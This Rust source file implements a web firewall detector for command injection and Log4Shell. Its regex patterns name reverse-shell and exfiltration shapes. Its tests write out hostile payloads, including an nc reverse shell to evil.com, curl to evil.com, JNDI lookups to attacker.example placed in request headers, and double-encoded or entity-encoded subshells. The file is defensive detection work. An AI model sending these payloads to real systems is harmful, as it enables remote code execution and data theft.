//! Command injection detector. Scans query string + request body
//! for shell-shaped patterns: subshell forms (`$()`, backticks,
//! `${}`), pipe-to-shell-cmd, semicolon-shell-cmd, command-chain
//! operators (`&&`, `||`), direct `/bin/sh` invocation, and
//! reverse-shell shapes (`bash -i`, `nc -e`).
//!
//! Mirror of sqli/xss/ssrf shape — regex over the URI string +
//! body bytes (with URL-decode), with field tagging for the audit
//! log. Score 50 (same weight as sqli / xss / ssrf — high-
//! confidence shell-context patterns).
//!
//! ## Why this exists separately from `path_traversal`
//!
//! Pre-2026-05-08 the rule pipeline had no dedicated cmdi class.
//! `$()`, `|`, and backticks fell through every regex set. The
//! AI detector caught most cmdi shapes empirically, but with AI
//! disabled (the standard config post-Run-2 C002 follow-up) the
//! rule-based pipeline missed them entirely. QA Run-4 SEC-M002
//! flagged `?input=test|whoami` and `?arg=$(id)` as undetected.
//!
//! This detector closes that gap with explicit shell-context
//! patterns. Conservative trigger list: shell builtins (`whoami`,
//! `nc`, `cat /etc/passwd`, ...) AFTER a metacharacter, not bare
//! metacharacters — so legit query strings with `|` (regex
//! patterns), `$` (template variables), or `&&` (URL-encoded
//! `&` followed by another param) don't false-positive.

use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

use super::{Detector, Signal};

/// Stateless command-injection detector.
pub struct CommandInjectionDetector;

/// 2026-05-08 GAP-008 — Log4Shell (CVE-2021-44228) patterns.
/// Checked **before** the baseline cmdi patterns and emit at
/// **score 60** (Critical-RCE / known-CVE tier — one tier above
/// baseline cmdi). Justification: CVSS 10.0, active in the wild,
/// pattern specificity makes FP essentially zero on real traffic.
///
/// Headers are scanned (User-Agent, Referer, Authorization,
/// Cookie, X-Api-Version, X-Real-IP, X-Forwarded-For,
/// X-Requested-With) because active exploitation predominantly
/// arrives in those rather than URL/body.
static LOG4SHELL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Direct ${jndi:<scheme>://...} — canonical Log4Shell.
        // Scheme allowlist covers every documented exploitation
        // primitive (LDAP/RMI/DNS/etc.).
        r"(?i)\$\{jndi\s*:\s*(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http|https)\s*:",
        // Bare ${jndi: without scheme — defense-in-depth.
        r"(?i)\$\{jndi\s*:",
        // Nested obfuscation: ${${::-j}${::-n}${::-d}${::-i}:...}
        // Requires the suspicious ${${...} nesting with letters
        // j, n, d, i appearing in inner expressions in order
        // followed by `:`. Bare ${HOME} envvars don't match
        // because there's no nested ${${...}.
        r"(?i)\$\{[^}]*\$\{[^}]*j[^}]*\}[^}]*\$\{[^}]*n[^}]*\}[^}]*\$\{[^}]*d[^}]*\}[^}]*\$\{[^}]*i[^}]*\}[^}]*:",
        // Case-folding obfuscation: ${${lower:j}ndi:...}
        // Catches the ${${(lower|upper|env|sys|date):X}...} shape,
        // which is unique to Log4j substitution lookups.
        r"(?i)\$\{[^}]*\$\{(?:lower|upper|env|sys|date)\s*:[^}]*\}[^}]*\}",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("log4shell regex compiles"))
    .collect()
});

static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Subshell forms: $(cmd), `cmd`, ${cmd}.
        // Conservative — require non-empty content to skip lone
        // `$()` strings that occasionally appear in templates.
        r"(?i)\$\([^)]+\)",
        r"(?i)`[^`]+`",
        r"(?i)\$\{[A-Za-z_][^}]+\}",
        // Pipe-to-shell-cmd: `| whoami`, `| nc -e ...`. The
        // shell-builtin list catches the OWASP cmdi sample set
        // and stays narrow enough to skip bare pipes in regex /
        // base64 / OR-style filter expressions. `sleep` and
        // `timeout` added 2026-05-09 (Run-6 GAP-013) for blind-RCE
        // detection — `;sleep+5;` is the canonical primitive when
        // the attacker has no output channel.
        r"(?i)\|\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b)\b",
        // Semicolon-shell-cmd: `; whoami`, `; rm -rf /tmp`,
        // `; sleep 5` (blind-RCE primitive — GAP-013).
        r"(?i);\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b)\b",
        // Logical-AND / logical-OR command chaining.
        r"(?i)(?:&&|\|\|)\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|sleep\b|timeout\b)\b",
        // /bin/{sh,bash,zsh,ksh,dash} direct invocation.
        r"(?i)/bin/(?:sh|bash|zsh|ksh|dash)\b",
        // Classic exfil shape — `cat /etc/passwd`. (Distinct
        // from path_traversal's `/etc/passwd` URL-path match —
        // this catches the cmdi shape `;cat /etc/passwd`.)
        r"(?i)cat\s+/etc/passwd",
        // Reverse-shell shapes.
        r"(?i)bash\s+-i\b",
        r"(?i)nc\s+-e\b",
        r"(?i)mkfifo\s+",
        // Wget / curl exfil to attacker hosts when paired with
        // shell-injection context (semicolon, pipe, backtick
        // before the cmd). Overlaps with SSRF on URL surface;
        // this catches the cmdi shape specifically.
        r"(?i)(?:^|;|\|\|?|&&|`|\$\()\s*(?:wget|curl)\s+[a-z]+://",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("cmdi regex compiles"))
    .collect()
});

impl Detector for CommandInjectionDetector {
    fn id(&self) -> &'static str {
        "command_injection"
    }

    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();

        // S1 (2026-05-18) — multi-variant decoder. Catches
        // `%2524%2528id%2529` (double-encoded `$(id)`), entity-
        // encoded `&dollar;(id)`, and unicode-escape forms in
        // addition to the previous single-pass URL decode.
        let raw_uri = req.uri.to_string();
        for variant in super::normalize_for_detection(&raw_uri) {
            check(&variant, "uri", &mut signals);
            if !signals.is_empty() {
                break;
            }
        }

        // Body — first 8 KiB.
        let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
        if !body.is_empty() && signals.is_empty() {
            for variant in super::normalize_for_detection(body) {
                check(&variant, "body", &mut signals);
                if !signals.is_empty() {
                    break;
                }
            }
        }

        // 2026-05-08 GAP-008 — Log4Shell payloads frequently
        // arrive in headers (UA, Referer, custom auth/version
        // headers). Scan a conservative allowlist of common
        // headers; broader header scans risk header_injection
        // overlap.
        for name in HEADER_SCAN_ALLOWLIST {
            if let Some(val) = req.headers.get(*name).and_then(|v| v.to_str().ok()) {
                check(val, name, &mut signals);
                check(&super::url_decode(val), name, &mut signals);
            }
        }

        signals
    }
}

/// Header allowlist for Log4Shell payload scanning. Scoped to
/// fields commonly logged by application frameworks (Spring,
/// Tomcat, log4j patterns) — broadening risks header_injection
/// overlap on every request.
const HEADER_SCAN_ALLOWLIST: &[&str] = &[
    "user-agent",
    "referer",
    "x-api-version",
    "x-forwarded-for",
    "x-real-ip",
    "authorization",
    "cookie",
    "x-requested-with",
];

fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
    // GAP-008 (2026-05-08) — Log4Shell first; score 60 (Critical
    // RCE / known-CVE tier). Same field tag as baseline cmdi so
    // the audit log + by-class counter stay coherent — operators
    // grep for "${jndi:" in audit if they need to differentiate.
    for re in LOG4SHELL_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: super::scores::command_injection::LOG4SHELL,
                tag: "command_injection".into(),
                field: field.into(),
            });
            return;
        }
    }
    // Baseline cmdi patterns; score 50 (high-confidence
    // injection tier).
    for re in CMDI_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: super::scores::command_injection::BASELINE,
                tag: "command_injection".into(),
                field: field.into(),
            });
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn view_with_uri(uri: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::GET,
            uri.parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        )
    }

    fn make_view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m,
            uri: u,
            version: http::Version::HTTP_11,
            headers: h,
            peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None,
            body: b,
        }
    }

    macro_rules! positive {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    !d.inspect(&req).is_empty(),
                    "expected detection for: {}",
                    $input,
                );
            }
        };
    }

    macro_rules! negative {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    d.inspect(&req).is_empty(),
                    "false positive for: {}",
                    $input,
                );
            }
        };
    }

    // --- QA Run-4 reproductions ---
    positive!(cmdi_pipe_whoami_input,    "/search?input=test|whoami");
    positive!(cmdi_subshell_arg,         "/run?arg=$(id)");
    positive!(cmdi_pipe_q,               "/search?q=test|nc%20-e%20/bin/sh");

    // --- Subshell shapes ---
    positive!(cmdi_backtick,             "/exec?x=`whoami`");
    positive!(cmdi_brace_subshell,       "/exec?x=${PATH}");
    positive!(cmdi_subshell_url_encoded, "/run?x=%24%28id%29");
    positive!(cmdi_backtick_url_encoded, "/run?x=%60whoami%60");

    // --- Chain operators ---
    // (Spaces URL-encoded as %20 so http::Uri accepts them.)
    positive!(cmdi_semicolon_rm,         "/run?cmd=foo;rm%20-rf%20/tmp");
    positive!(cmdi_double_pipe,          "/run?cmd=ls||whoami");
    positive!(cmdi_double_amp,           "/run?cmd=ls&&whoami");
    positive!(cmdi_semicolon_curl,       "/run?cmd=foo;curl%20http://evil.com");

    // --- Direct shell invocation ---
    positive!(cmdi_bin_sh,               "/exec?cmd=/bin/sh%20-c%20id");
    positive!(cmdi_bin_bash,             "/exec?cmd=/bin/bash");
    positive!(cmdi_bash_dash_i,          "/exec?cmd=bash%20-i");
    positive!(cmdi_nc_dash_e,            "/exec?cmd=nc%20-e%20/bin/sh%20evil.com%204444");

    // --- Exfil ---
    positive!(cmdi_cat_passwd,           "/run?cmd=cat%20/etc/passwd");
    positive!(cmdi_mkfifo,               "/run?cmd=mkfifo%20/tmp/p");

    // --- Body ---
    // (URI must be valid; payload lives in query for these.)
    positive!(cmdi_in_body_via_query,    "/api/run?p=foo;whoami");

    // --- GAP-013 (Run-6, 2026-05-09) — blind RCE / time-based ---
    // `sleep`/`timeout` after a metacharacter is the canonical
    // blind-cmdi primitive when the attacker has no output channel.
    // Pattern requires `;`, `|`, or `&&`/`||` prefix — bare
    // `?action=sleep` doesn't fire.
    positive!(cmdi_blind_sleep_semicolon, "/api?x=a;sleep+5");
    positive!(cmdi_blind_sleep_pipe,      "/api?x=a|sleep+5");
    positive!(cmdi_blind_sleep_double_amp, "/api?x=a&&sleep+10");
    positive!(cmdi_blind_sleep_double_pipe, "/api?x=a||sleep+5");
    positive!(cmdi_blind_timeout,         "/api?x=test;timeout+5+whoami");
    positive!(cmdi_blind_sleep_then_echo, "/api?x=a;sleep+5;echo+done");

    // --- Negatives: common FP traps ---
    negative!(clean_root,                "/");
    negative!(clean_query_simple,        "/search?q=hello");
    negative!(clean_pipe_in_regex,       "/api/regex?p=foo|bar");        // bare pipe, no shell builtin after
    negative!(clean_amp_in_query,        "/api?a=1&b=2");
    negative!(clean_semicolon_legacy,    "/api?a=1;b=2");                // legacy ';' separator, no shell cmd
    negative!(clean_base64_padding,      "/api?b=YWJjZA%3D%3D");
    negative!(clean_dollar_var_template, "/api?v=%24user");              // $user (no parens/braces)
    negative!(clean_paren_in_query,      "/api?expr=(a+b)");             // bare parens, no $ prefix
    negative!(clean_path_query,          "/api/v2/users?id=42");
    negative!(clean_static_asset,        "/static/main.js");
    // GAP-013 negatives — `sleep`/`timeout` without metacharacter
    // prefix must NOT fire. Ordinary `?timeout=300` URL params
    // and prose mentions like "I will sleep tonight" stay green.
    negative!(clean_action_sleep,        "/api?action=sleep");
    negative!(clean_timeout_param,       "/api?timeout=300");
    negative!(clean_msg_sleep_word,      "/post?msg=I+will+sleep+tonight");
    negative!(clean_sleep_filename,      "/files/sleep_research.pdf");

    // Edge — `${user.name}` template var. Brace-subshell pattern
    // requires a leading [A-Za-z_], so `${user.name}` matches.
    // Document this is acceptable: legit-looking template vars
    // are rare in URL query strings (they belong in templates,
    // not user input). Operators using template-style variables
    // in URLs can disable this class via /api/detectors.
    positive!(cmdi_brace_var_user_dot,   "/api?v=${user.name}");

    // ============================================================
    // GAP-008 (2026-05-08) — Log4Shell coverage
    // ============================================================

    // Log4Shell direct ${jndi:<scheme>://...} — score 60 group.
    positive!(log4shell_ldap_url,        "/?x=${jndi:ldap://attacker.com/a}");
    positive!(log4shell_rmi_url,         "/?x=${jndi:rmi://attacker.com/a}");
    positive!(log4shell_dns_url,         "/?x=${jndi:dns://attacker.com/a}");
    // Bare ${jndi:` (no scheme) — second-line defense.
    positive!(log4shell_bare,            "/?x=${jndi:foo}");
    // Nested obfuscation ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
    positive!(log4shell_nested_obfusc,
        "/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}");
    // Case-folding obfuscation ${${lower:j}ndi:rmi://...}
    positive!(log4shell_case_fold,
        "/?x=${${lower:j}ndi:rmi://evil.com/a}");
    positive!(log4shell_env_lookup,
        "/?x=${${env:HOME:-j}ndi:rmi://evil.com/a}");

    // S1 (2026-05-18) — decoder-evasion positives.
    // Double URL-encoded $(id) and entity-encoded subshell forms.
    positive!(cmdi_double_url_encoded_subshell, "/api?x=test%253B%2524%2528id%2529");
    positive!(cmdi_html_entity_semi_dollar,     "/api?x=test&semi;&dollar;(id)");
    positive!(cmdi_unicode_escape_subshell,     "/api?x=test\\u003B\\u0024(id)");
    positive!(cmdi_hex_escape_pipe,             "/api?x=test\\x7Cwhoami");

    // Verify the score is 60 (not 50) for Log4Shell hits.
    #[test]
    fn log4shell_emits_score_60_not_baseline_cmdi() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?x=${jndi:ldap://evil.com/a}");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        let log4_signal = signals
            .iter()
            .find(|s| s.tag == "command_injection")
            .expect("Log4Shell payload should fire cmdi");
        assert_eq!(
            log4_signal.score, 60,
            "Log4Shell tier should emit score 60 (not baseline cmdi 50)",
        );
    }

    #[test]
    fn baseline_cmdi_emits_score_50() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?x=$(id)");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        let cmdi_signal = signals
            .iter()
            .find(|s| s.tag == "command_injection")
            .expect("baseline cmdi should fire");
        assert_eq!(
            cmdi_signal.score, 50,
            "baseline cmdi tier should emit score 50",
        );
    }

    // Header scan — Log4Shell payloads in User-Agent / Referer /
    // Authorization. Active exploitation primarily uses these.
    #[test]
    fn log4shell_in_user_agent_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert(
            "user-agent",
            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(
            signals.iter().any(|s| s.tag == "command_injection" && s.score == 60),
            "Log4Shell in UA must catch at score 60",
        );
    }

    #[test]
    fn log4shell_in_referer_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert("referer", "${jndi:rmi://evil/x}".parse().unwrap());
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    #[test]
    fn log4shell_in_x_api_version_caught() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let mut h = http::HeaderMap::new();
        h.insert("x-api-version", "${jndi:ldap://x/y}".parse().unwrap());
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    // Negative — plain envvar template strings must NOT match
    // Log4Shell. ${HOME}, ${USER}, ${PATH} are legitimate shell-
    // template substitutions that some apps echo into URL/body.
    #[test]
    fn plain_envvar_brace_does_not_match_log4shell() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?p=${HOME}/dir");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        // It MAY match the baseline cmdi `${VAR}` pattern (score 50)
        // but must NOT match Log4Shell (score 60).
        assert!(
            signals.iter().all(|s| s.score != 60),
            "plain envvar must not match Log4Shell tier",
        );
    }

    #[test]
    fn legit_template_does_not_match_log4shell() {
        let d = CommandInjectionDetector;
        let (m, u, h, b) = view_with_uri("/?p=${USER}");
        let req = make_view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(signals.iter().all(|s| s.score != 60));
    }

    // ---- GAP-008b (Run-6, 2026-05-09) — header-borne obfuscation
    // regression coverage. The QA Run-6 corpus reported these shapes
    // as "missed" in headers; the patterns added in Run-5 should
    // already cover them. Pin the exact payloads so any future
    // refactor that breaks them is caught immediately.
    fn log4shell_header_view(name: &'static str, val: &str) -> http::HeaderMap {
        let mut h = http::HeaderMap::new();
        h.insert(name, val.parse().unwrap());
        h
    }

    #[test]
    fn log4shell_ua_nested_obfuscation_blocks() {
        // ${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "nested ${{::-j}}-style obfuscation in UA must trip Log4Shell at score 60",
        );
    }

    #[test]
    fn log4shell_ua_lower_obfuscation_blocks() {
        // ${${lower:j}ndi:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${lower:j}ndi:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "lower:j case-fold obfuscation in UA must trip Log4Shell at score 60",
        );
    }

    #[test]
    fn log4shell_ua_upper_obfuscation_blocks() {
        // ${${upper:j}ndi:ldap://x.com/a}
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${upper:j}ndi:ldap://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "upper:j case-fold obfuscation in UA must trip Log4Shell at score 60",
        );
    }

    #[test]
    fn log4shell_referer_nested_obfuscation_blocks() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "referer",
            "https://example.com/?x=${${::-j}${::-n}${::-d}${::-i}:dns://x.com/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "nested obfuscation in Referer must trip Log4Shell at score 60",
        );
    }

    #[test]
    fn log4shell_authorization_header_blocks() {
        // Active-exploitation shape: bearer token slot abused for JNDI.
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "authorization",
            "Bearer ${${lower:j}ndi:ldap://attacker.example/x}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "obfuscated Log4Shell in Authorization must trip at score 60",
        );
    }

    #[test]
    fn log4shell_cookie_header_blocks() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "cookie",
            "session=${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(
            d.inspect(&req).iter().any(|s| s.score == 60),
            "obfuscated Log4Shell in Cookie must trip at score 60",
        );
    }

    // 2026-05-09 — Run-7 GAP-008b regression. The QA report claimed
    // "UA basic ${jndi:ldap://...}, UA RMI variant, UA nested
    // ${${::-j}...}, UA lowercase-obfuscated ${${lower:j}ndi:...},
    // Referer ${jndi:ldap://...}" still missed. Each is pinned
    // here against the current code so the next QA run can't
    // re-flag without an actual regression. If any of these fail,
    // the QA harness was running an outdated binary.
    #[test]
    fn log4shell_run7_ua_basic_ldap() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${jndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    #[test]
    fn log4shell_run7_ua_rmi_variant() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${jndi:rmi://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    #[test]
    fn log4shell_run7_ua_nested_obfuscation() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view(
            "user-agent",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/x}",
        );
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    #[test]
    fn log4shell_run7_ua_lowercase_obfuscation() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("user-agent", "${${lower:j}ndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }

    #[test]
    fn log4shell_run7_referer_basic_ldap() {
        let d = CommandInjectionDetector;
        let u: http::Uri = "/".parse().unwrap();
        let m = http::Method::GET;
        let h = log4shell_header_view("referer", "${jndi:ldap://attacker.example/x}");
        let b = BodyPeek::empty();
        let req = make_view(&m, &u, &h, &b);
        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
    }
}
